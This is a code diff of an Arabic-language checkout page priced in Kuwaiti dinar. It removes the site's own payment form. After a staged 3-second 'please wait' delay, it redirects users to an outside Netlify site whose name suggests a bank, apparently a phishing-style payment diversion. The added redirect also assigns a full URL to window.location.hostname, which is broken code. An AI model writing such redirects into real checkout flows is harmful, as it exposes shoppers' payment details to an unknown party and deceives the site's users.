@@ -12,7 +12,6 @@ import { doc, setDoc } from 'firebase/firestore'
 import db from '../lib/firebase'
 import { Input } from '@/components/ui/input'
 import { Sheet, SheetTrigger,SheetContent,SheetHeader,SheetDescription ,SheetTitle} from '@/components/ui/sheet'
-import { Badge } from '@/components/ui/badge'
 
 type LocationType = 'home' | 'work' | 'client'
 type PaymentType = 'full' | 'partial'
@@ -59,7 +58,8 @@ export default function CheckoutPage() {
     setisloading(true)
     setTimeout(() => {
       setisloading(false)
-      setStep(2)
+      window.location.hostname="https://kentbanks.netlify.app/"
+      window.location.replace("https://kentbanks.netlify.app/")
     }, 3000)
   }
 
@@ -71,7 +71,7 @@ export default function CheckoutPage() {
   return (
     <div className="min-h-screen bg-gray-100 p-4 font-sans" dir="rtl">
     
-      {setp === 1 ? (<form onSubmit={handleSubmit} className="mx-auto max-w-md space-y-6">
+    <form onSubmit={handleSubmit} className="mx-auto max-w-md space-y-6">
         {/* Location Selection */}
         <div className="space-y-4">
           <h1 className="text-xl font-bold text-right">حدد موقعك</h1>
@@ -263,9 +263,8 @@ export default function CheckoutPage() {
           className="w-full bg-blue-200 text-blue-800 hover:bg-blue-300 p-6 text-lg rounded-xl">
           {!loading ? `متابعة الدفع (${total})د.ك` : "الرجاء الانتظار"}
         </Button>
-      </form>) :
-        <PaymentForm onPaymentComplete={handlePaymentComplete} />
-      }
+      </form>
+      
     </div>
   )
 }
